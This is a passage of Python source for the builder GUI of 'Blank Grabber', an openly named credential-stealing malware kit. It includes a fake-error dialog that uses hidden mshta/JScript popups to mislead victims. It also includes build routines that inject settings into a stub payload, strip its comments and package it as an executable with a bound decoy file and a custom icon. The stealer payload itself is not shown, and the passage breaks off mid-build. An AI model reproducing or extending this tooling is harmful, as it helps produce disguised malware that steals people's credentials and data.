	def ok_Event(self) -> None:
		if self.limitVar.get().isdigit():
			self.limit = int(self.limitVar.get())
			self.destroy()
		else:
			messagebox.showerror("Error", "The size should be a positive number!")
	
	def on_limit_change(self, _):
		limitBoxText = self.limitVar.get()
		if limitBoxText.isdigit():
			self.okButton.configure(state= "normal")
			self.okButton.configure(fg_color= "green")
		else:
			self.okButton.configure(state= "disabled")
			self.okButton.configure(fg_color= "red")
	
class FakeErrorBuilder(ctk.CTkToplevel):

	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Blank Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
		self.geometry("833x563")
		self.resizable(True, False)

		self.master = master
		self.font = ctk.CTkFont(size= 20)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 1)
		self.rowconfigure(2, weight= 1)
		self.rowconfigure(3, weight= 1)
		self.rowconfigure(4, weight= 1)
		self.rowconfigure(5, weight= 1)
		self.rowconfigure(6, weight= 1)
		self.rowconfigure(7, weight= 1)
		self.rowconfigure(8, weight= 2)

		self.columnconfigure(1, weight= 1)

		self.iconVar = ctk.IntVar(self, value= 0)

		self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= self.font)
		self.titleEntry.grid(row = 0, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= self.font)
		self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= self.font)
		self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 20)

		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= self.font)
		self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 20)

		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= self.font)
		self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 20)

		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= self.font)
		self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 20)

		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
		self.testButton.grid(row= 4, column= 2, padx= 20)

		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
		self.saveButton.grid(row= 5, column= 2, padx= 20)
	
	def testFakeError(self) -> None:
		title= self.titleEntry.get()
		message= self.messageEntry.get()
		icon= self.iconVar.get()

		if title.strip() == "":
			title= "Title"
			self.titleEntry.insert(0, title)
		
		if message.strip() == "":
			message= "Message"
			self.messageEntry.insert(0, message)
		
		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
		subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
	
	def saveFakeError(self) -> None:
		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
		message= self.messageEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")

		icon= self.iconVar.get()

		if title.strip() == message.strip() == "":
			self.master.fakeErrorData = [False, ("", "", 0)]
			self.destroy()

		elif title.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		elif message.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		self.master.fakeErrorData = [True, (title, message, icon)]
		self.destroy()

class Builder(ctk.CTk):
	
	def __init__(self) -> None:
		super().__init__()

		ctk.set_appearance_mode("dark")
		self.title("Blank Grabber [Builder]")
		self.iconbitmap(os.path.join("Extras", "icon.ico"))
		self.geometry("1250x600")
		self.resizable(False, False)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 5)

		self.columnconfigure(0, weight= 1)
		self.columnconfigure(1, weight= 0)

		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
		self.titleLabel.grid(row= 0, column= 0)

		self.builderOptions = BuilderOptionsFrame(self)
		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
	
	def BuildPythonFile(self, config: str) -> None:
		options = json.loads(config)
		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
		if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
			return
		
		with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
			code = file.read()
		
		sys.path.append(os.path.join(os.path.dirname(__file__), "Components")) # Adds Components to PATH

		if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
			try:
				shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
			except Exception:
				pass
		from Components import process
		_, injection = process.ReadSettings()
		code = process.WriteSettings(code, options, injection)

		if os.path.isfile(outPath):
			os.remove(outPath)

		try: 
			code = ast.unparse(ast.parse(code)) # Removes comments
		except Exception: 
			pass

		code = "# pip install pyaesm urllib3\n\n" + code

		with open(outPath, "w") as file:
			file.write(code)

		messagebox.showinfo("Success", "File saved as %r" % outPath)
	
	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
		def Exit(code: int = 0) -> None:
			os.system("pause > NUL")
			exit(code)
		
		def clear() -> None:
			os.system("cls")
		
		def format(title: str, description: str) -> str:
			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
		
		self.destroy()
		Utility.ToggleConsole(True)
		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
		clear()

		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
				clear()
				if res.returncode != 0:
					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
					Exit(1)

		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
			if os.path.isfile(fileloc := os.path.join(datadir, i)):
				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
			else:
				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))

		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file: